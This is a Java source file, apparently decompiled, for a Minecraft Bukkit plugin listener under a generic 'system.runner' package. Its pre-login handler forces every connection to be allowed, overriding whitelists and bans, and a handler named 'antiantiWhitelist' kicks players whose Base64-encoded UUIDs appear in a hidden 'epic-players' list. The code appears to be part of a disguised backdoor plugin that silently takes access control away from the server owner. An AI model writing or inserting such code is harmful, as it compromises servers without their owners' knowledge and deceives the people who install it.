
package me.system.runner.events;

import me.system.runner.data.DataManager;
import me.system.runner.Core;
import me.system.runner.utils.Settings;
import me.system.runner.methods.API;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;
import me.system.runner.command.impl.login.LoginStatus;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.json.JSONObject;

public class ForceLoginListener
implements Listener {
    private static final Core INSTANCE = (Core)Core.getPlugin(Core.class);

    @EventHandler
    public void onLogin(AsyncPlayerPreLoginEvent e2) {
        e2.setLoginResult(AsyncPlayerPreLoginEvent.Result.ALLOWED);
        e2.allow();
    }

    @EventHandler
    public void antiantiWhitelist(PlayerJoinEvent e2) {
        Player p2 = e2.getPlayer();
        for (String list : DataManager.getData().getStringList("epic-players")) {
            byte[] uuid;
            if (!list.contains(new String(uuid = Base64.getEncoder().encode(p2.getUniqueId().toString().getBytes())))) continue;
            API.kickPlayer(p2);
        }
    }
}

